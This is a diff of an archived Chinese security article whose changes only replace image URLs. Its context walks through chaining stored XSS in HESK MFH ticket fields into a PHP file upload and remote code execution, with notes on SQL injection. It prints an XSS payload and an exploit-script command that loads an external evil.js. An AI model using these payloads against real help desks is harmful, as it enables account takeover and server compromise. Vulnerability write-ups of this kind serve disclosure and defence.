@@ -60,7 +60,7 @@ schema_version: "1"
 
  Ots安全   2024-05-18 13:24  
   
-![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
+![](../../.resource/remote/c292852b5ce3f320791b17ba46561fa59050a881e960884f85fc33b8ebf6074e.gif "")  
   
 发现的漏洞导致 HESK (MFH)版本 2019.1.0 和低至版本 3.1.0 （2017 年 6 月 28 日）的Mods 出现三个不同的 CVE  
 - CVE-2020-13992 :: 多个存储的 XSS 问题允许未经身份验证的远程攻击者滥用帮助台用户的登录会话  
@@ -79,23 +79,23 @@ CVE-2020-13992 和 CVE-2020-13994 可以链接在一起，正如您将在本文�
   
 我下载了 HESK 2019.1.0 的 Mod 并进入安装目录。与 HESK 软件一样，除非您在安装后删除安装目录，否则它也会拒绝运行，我认为这是很好的做法。我登录到管理区域环顾四周 - 进行“游览”。这始终是一个很好的开始方式 - 熟悉您正在测试或代码审查的应用程序。  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6uvABRq8DOavWpWqlXsq7mQ171MmQTeaTbLKX5f8zdlkwZ4Wr6eibOEA/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/da6b636e8d9ad8593c869b9a5b2fc6523fb02afce318dc5c14412ef8fdc3bc93.png "")  
   
 这就是打开安装了 MFH 的 hesk 时的样子。好吧，除了电子邮件字段中的“hello@loco” （是的，我懒得再次编辑屏幕截图，抱歉）。在了解该应用程序时，我使用安装时创建的管理员用户登录。  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6p1G8X68s7ZrcloJK4yCul32bDuFe9NXz9yweeqyOic5yuxpq54IJgQA/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/998ad3c32803f4adb7a1ec367e76979fb1f10025c4a746c5536833ebe96243dc.png "")  
   
 登录后，很快就找到了设置页面。  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6lLPwc5ich8iab6HPU2mhVffxYyVlUk13juZG1Lic2YHMaytuvbKSB9pNg/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/655e32f9822039886f2ed01706dddce34621476070d3cc438f2606543e1757ca.png "")  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6zHjeRbHmHickkkf4Jc4OXn46ibDwticEjfvX5GP9LFdyC4CTAY1iaatUog/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/205cb54c48be9d19bdef55e1dcba0b7b655187bc396a575ce62c3db0e50bd99b.png "")  
   
 在探索应用程序的登录部分时，我注意到默认情况下启用上传附件的可能性。在设置中，我发现允许上传的文件扩展名是可配置的。这太有趣了。我还在帮助台部分发现了一个“show useragent”选项（默认情况下未启用）。嗯。此外，MFH 插件还有 UI 颜色部分 - 支持图像上传！我想要一种方法，所以我一直在查看用户输入，尤其是匿名用户可以提交带有文件上传的票证的情况。Burp 已经启用并且愿意，所以我退出了管理区域并提交了一张票：（暂时忽略文件上传）  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA694VGpmAuvU6xCvEHCEZIIYDGRtdk2eNtsSggBDafAQWstjXsXo3rfg/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/6387ac6e05b616efff0549112b91f05a40e0810980c3f3ed2749080dfb7b1dc4.png "")  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6lYBy49vibqB4UEYJs6A5Oo5bBEz7G4BanLZMSic4ia6uv2fEs4UtZwyjw/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/1ce4d8794c5c8a15abcc4e753cd534aed8c2135c72957f2aa7bf230fba7eb05c.png "")  
   
 我注意到原始 HESK 中没有 4 个字段。这太有趣了。计算  
 screen_resolution_height和  
@@ -107,19 +107,19 @@ longitude。尽管我现在对 HESK 软件源有些熟悉，但我发现通过 B
 <script>alert('longitude')</script>
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA64bwEQhPmBWsBh4686xwfRuDC2x8LEMFUsblibrpIdO62lBaf63wGB2A/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/076f7c0b04495eb9834aad8cb1ef14c82353563e8297544f5d6c58c473833a08.png "")  
   
 这就是我所做的，我使用“标准基本”XSS 有效负载注入经度和纬度。我发货后回复说：您的票已成功提交！票证 ID：Q95-JAY-H8LZ。到目前为止一切顺利，现在我将登录帮助台并查看票证。  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6E7bicl3USuhgBrjhQkib8DFF76IyUALzl65icWGpvuPG2DQC9xtJzgnpg/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/2abbe1361457e8ed4b491b4bbf90717457261ae413a44d492120a88171e67768.png "")  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6XK9Oylicoj9qVGRXmfvVRrPouAIQjlbmtK8AAmTACibgBBAcmeArklEQ/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/bcc59ddd6c41ee703b57c8649dea962319847242cebcc2d7112b91595eed8e71.png "")  
   
 每当我看到这个的时候，我的胃总是一阵刺痛。好吧，经度是可以注入的，但为什么纬度有效载荷没有发射呢？检查页面源代码发现我们实际上直接进入 JavaScript 并且不需要脚本标签。脚本标签实际上破坏了纬度注入和经度之后的 JavaScript 其余部分。这也是 devtools 和 console 告诉我们的：  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA610Zd8dyI3IZpk7Y5GY3ibsNUWqdq5Mbym7S3nk4Mf4LnZzBWOIiaPgFA/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/a425ae465a90d5e98ea270b5f58c9a7295fa6453c9f27381817c2344e92deff3.png "")  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6nYYlGCYPMdTF8iaKqr3zlys1SUzfEsbpAXbSmVEbibkfhxTN3Sfn87Cg/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/38b11b54223ae98d3755bcdcfed819d9060602abaa3f62916fbd55a98bfdb034.png "")  
   
 让我们通过将有效负载更改为来修复它：  
 ```
@@ -128,25 +128,25 @@ longitude。尽管我现在对 HESK 软件源有些熟悉，但我发现通过 B
 ```  
   
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6QOrvwSvMibicOn3bibzL9W9icib82ceK4eMZCUTlf3zAHniaLgwZHdvmvYaQ/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/5e62bf7cb6d3ccce297bad8f700192b6c6d625a2622f635ca26e88e527b7cad0.png "")  
   
 我撕掉所有饼干（以避免  
 $_SESSION['already_submitted']凝固）并运送它！我又得到一张票 Q2U-JDN-YXDU！单击管理面板中的票证...  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6F6MVLjDZyWmuia05N2Vk4VgUhF9GYBbVvMiar5KbeXX9tP8EkZWeOIuA/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/1dc84473d170166cb8a3088be252cf1509083d43df1628fd1bc46644b37bcae4.png "")  
   
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6UI9orYXYw7mROAV7YAtoPOJBlL2z5sKTckXYdwV6nSRwa4aszqdsDg/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/d9e85bd736fad00213b2ee80e1be75cd02f94b9277110d820a09369c7ede50cd.png "")  
   
 完美的！它完美地融合在一起。  
   
 是的，是的，我知道你在想什么，我们可以窃取会话 cookie 吗？不，至少在最新版本的 MFH 中不是这样。所以，我们能做些什么？  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA66fXyvnEUKMzguJz97dofEWpmEe6KyukCHNNWn0dl4VSE9465CC4Npg/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/8d57cc888f2611245a64a4b3f3165c8a20022cfb2c51f5e2cb5a05d4e5779e23.png "")  
   
 在我之前对 HESK 的研究中，我注意到上传附件功能。作为管理员，您可以更改附件上传允许的扩展名。黑客耳中的音乐！制作 XSS 来更改设置以允许 php 文件上传，提交带有附件的票证，并在票证中使用 XSS 来确定文件名 - 然后继续执行，我们就有了 RCE！在输入攻击脚本之前，请务必手动测试您的思路。我做到了，我很高兴。因为源代码中潜藏着一些非常好的东西：  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6yo2x3aIkw2ZplgkcMOgktmzw4zoDictPaEHn0AtEvIniaw77UzG8icSiaw/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/6fd2fe9f030d420f13127601f2510952a1c789273d38914d33503f81d01fef07.png "")  
   
 没有适合您的 PHP 扩展！好吧，如果网络服务器执行 php2、php6 或 php7，那么您很幸运 - 但这是我们无法进行攻击的条件。还记得 MFH UI 插件中的上传图片功能吗？我快速转到设置页面的底部并上传登录框标题图像的文件。我选择了一个可爱的小 PHP 文件：  
 ```
@@ -155,24 +155,24 @@ $_SESSION['already_submitted']凝固）并运送它！我又得到一张票 Q2U-
   
 同样，我可以阅读源代码来确定这个向量是否可能，但我认为仅使用应用程序函数来测试这个方向的第一步会快得多，如果不成功，我们将深入研究源代码。  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA65O8fGnyOw9l7H918ZLw1KGJqkesVW1odt3ibY86mU5kjG2XdtAkZTOA/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/54595184115edf078ccaf39579dd39e7bfa8db02bb860afb90f92d16b4239c01.png "")  
   
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6QoS2FUp4ibrTU591TwX8iaFvX5NlqT609sYRbP0spKEA0xJCRia9EX8iaQ/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/477e3e3fcbdef94ffc75b242cfc977d6342d84f0a2c87a44885f35d08c080115.png "")  
   
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6eicP5niczkfb1ftjbcM1KlVGCeCD3e36WkKiarW3L5Nns5pLY6JHGmDeg/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/5e7e93d4df030031144aa612512c3bfac365f7c58063dd51e99dd31e210756ca.png "")  
   
 正如您所看到的，没有什么可以阻止我在这里上传 PHP 文件。导航到登录屏幕，我找到了图片，或者至少是它的占位符。“src”属性显示了放入 /cache 文件夹中的“后门”。在另一个选项卡中打开它可以为我们提供每个黑客都想要的东西，即在网络服务器上执行代码。  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6LrFmDstAib6IGANmibIz33EzJOLvmre3v027ek3WLP3ceMHlRxXOODDw/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/074667c2748850f4529fc2c5bee8fc7b99345503f4b15ffb88da7f775eaf9f1a.png "")  
   
 现在我们知道我们想要什么，但是我们如何实现它，我们可以将整个 JavaScript 负载放入数据库吗？我们遇到了 hesk 数据库：  
 mysql -u root然后  
 use hesk;。  
 describe hesk_tickets;这表明我们在经度和纬度各有 100 个角色可以玩。好吧，我们可能可以摆脱这个（嘘！用户代理标头也容易受到 XSS 的攻击 - 并且它在数据库中的类型是 TEXT！），但我没有时间对代码进行微优化，尽管我真的很喜欢它。我们还可以在任一可见票证字段中对一些有效负载数据进行 Base64 编码，但这不会很隐蔽......  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6JJPAJia1OvmAyAicKXNlo0Xga784AjvIeHGFMsZ1t2xnxwVIrNy7ta0g/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/fac448e58506bf4c29eeb25d5de5b569700a7ad48727faa19e4c03f5c0824732.png "")  
   
 改天我们将跨越 CSP 旁路（例如通过利用附件 :D）桥，现在我将解决加载外部脚本的问题。有一千种方法可以做到这一点，但我选择了（localhost在这里工作，因为我正在攻击本地安装的web应用程序）：  
 ```
@@ -226,7 +226,7 @@ describe hesk_tickets;这表明我们在经度和纬度各有 100 个角色可�
   
 想象一下，票证被自动分配给有限的用户。如果是这种情况，我们可以将其重新分配给管理员用户：D。进一步研究表明，向其他用户发送消息的页面实际上似乎列出了 HESK 管理区域的所有注册用户。  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6j0YuvJoWkMUiaWVz5zxCwWTdeJG44alYEticADGEicQw50PicXo81MuRdQ/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/1ba08a6671107923e6dbb4b659d276c7b0dc539224ae449c93b7081641e388c8.png "")  
   
 这很有帮助，而且 - 用户 ID 也被公开了。除非有人严重搞乱了 HESK 的安装，否则 userid 1 将始终是管理员用户。它无法删除或降级。  
   
@@ -428,29 +428,29 @@ python ticketXXs.py http://localhost/ http://localhost/js/evil.js
   
 这是一个用户非常有限的示例，甚至无法重新分配票证：  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6AO6fuA0xFXc2u8KZmwTibmAzFfR9yNfYzGm2BmPAruM6rbqzeNDVwPA/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/2e2e77fcecf25b17328eb3afece31795a3cb2eebae99d61bc25eb7c79a0ef81b.png "")  
   
 受限用户打开新分配的票证，执行 JavaScript - 无法分配管理员，因此自动选择网络钓鱼选项：  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6UWib7Ogm7kxXj8sriaia9MZe8wnCpZ1fWH4iaQpovPPGJJ7P8XdVrEj5Ug/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/140e80153582cbfd191a2c08e2f4561617d8ecb98f40571ef7dee4ac23658d3e.png "")  
   
 管理员用户有一条新消息：  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6jYJJrKWU2w6oEjwhiacVYL28IWvFnRMhNdKAf8e1jcj1TQicdPMf2eHw/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/084ba711b6f298c5fb659d31204be0e8f4487c6ea78204ead7cdc5fb6d0f9fa1.png "")  
   
 管理员用户单击受感染票证的链接：  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA67tKOkOltlCVKiamFrOXLN6L9M9GXnY5oQ3ibcmb4AMKrrdUiaZKz1bECw/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/773bff1683041a7758cbee403e66d909bac457234b32cd6965c5dd065442f7bb.png "")  
   
   
 管理员有上传UI图片的权限，pwned：  
   
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6vV5MB5icEsVY6839C38VkS1PIkINppXyXibKHNKwNWvbN5D0jZG5ARhA/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/919f477c9b77f11b241cda58c7cdb24a5a592f7e327d9fa42577ad3c82a103de.png "")  
   
 远程代码执行：  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/rWGOWg48tafeCNaUVXUAw6ww5h6sDYA6Zw5VlNJGQQNy3AxF4r2wxFicQBxmyyftPBiblHjnIFiaCLnTA0f63wZXw/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/582e71ee5b15d5f5094ea0e08c036e3767288ba88b7a08c4c484f406c65a581c.png "")  
   
 请注意，如果目标启用了某种验证码（默认情况下未启用），则此操作将不起作用。但这只是您在需要时通过 Burp 发送的一个请求。最后，还记得submit_ticket.php中的screen_resolution_heightand吗？screen_resolution_width嗯，它们实际上都容易受到 SQL 注入攻击。我们不需要这个漏洞来绕过这里的身份验证。此攻击应该适用于 -2019.1.0- 和 -2017 年 6 月 28 日版本 3.1.0- 之间的 HESK 版本 Mod，因为这些版本容易受到 SQL 注入、XSS 和 RCE 的攻击。  
   
@@ -477,19 +477,19 @@ https://loca1gh0s7.github.io/MFH-from-XSS-to-RCE-loca1gh0st-exercise/
   
 感谢您抽出  
   
-![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
+![](../../.resource/remote/2adcd65f51170e6241e0a6a9482f423e400f1f6854314e975fce72c4afdcc922.gif "")  
   
 .  
   
-![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
+![](../../.resource/remote/a83efad772f5c06b2458eb7e0ce7938c0788e296490deee3c42225d86e054d8c.gif "")  
   
 .  
   
-![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
+![](../../.resource/remote/945127ead0569aa369bfd017fdd8ed70a3d39aeca2704fa3aa11c6d268e664f9.gif "")  
   
 来阅读本文  
   
-![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
+![](../../.resource/remote/0ae141ea7d92bd4e04c5b56f9fe14741702da43798d3af484e2df4eea96e4221.gif "")  
   
 **点它，分享点赞在看都在这里**  
   
